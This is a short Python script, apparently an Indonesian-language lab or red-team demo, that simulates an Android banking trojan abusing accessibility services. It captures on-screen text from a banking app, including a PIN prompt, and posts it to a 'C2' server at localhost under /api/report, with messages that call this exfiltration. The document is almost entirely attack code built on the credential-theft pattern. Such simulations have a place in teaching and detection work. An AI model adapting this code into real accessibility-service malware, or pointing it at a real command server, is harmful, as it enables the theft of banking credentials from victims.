import time
import requests

C2_SERVER = "http://localhost:3000"
DEVICE_ID = "test-device-01"

class SimulatedAccessibilityService:
    def __init__(self):
        print("[*] Layanan SimulatedAccessibilityService diaktifkan.")

    def on_accessibility_event(self, event_type, target_package, text_content):
        print(f"[EVENT] Terdeteksi interaksi pada aplikasi: {target_package}")
        payload = {
            "deviceId": DEVICE_ID,
            "log": f"accessibility_{event_type}",
            "data": f"Target App: {target_package} | Captured Text: {text_content}",
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
        }
        self.exfiltrate_data(payload)

    def exfiltrate_data(self, payload):
        try:
            response = requests.post(f"{C2_SERVER}/api/report", json=payload)
            if response.status_code == 200:
                print("[+] Data eksfiltrasi layanan berhasil dikirim ke C2.")
            else:
                print("[-] Server C2 menolak data.")
        except Exception as e:
            print("[!] Gagal terhubung ke C2:", e)

if __name__ == "__main__":
    service = SimulatedAccessibilityService()
    # Simulasi menangkap teks saat korban membuka aplikasi m-banking tiruan
    time.sleep(1)
    service.on_accessibility_event("window_content_changed", "com.banking.app", "Masukan PIN M-Banking: [REDACTED]")
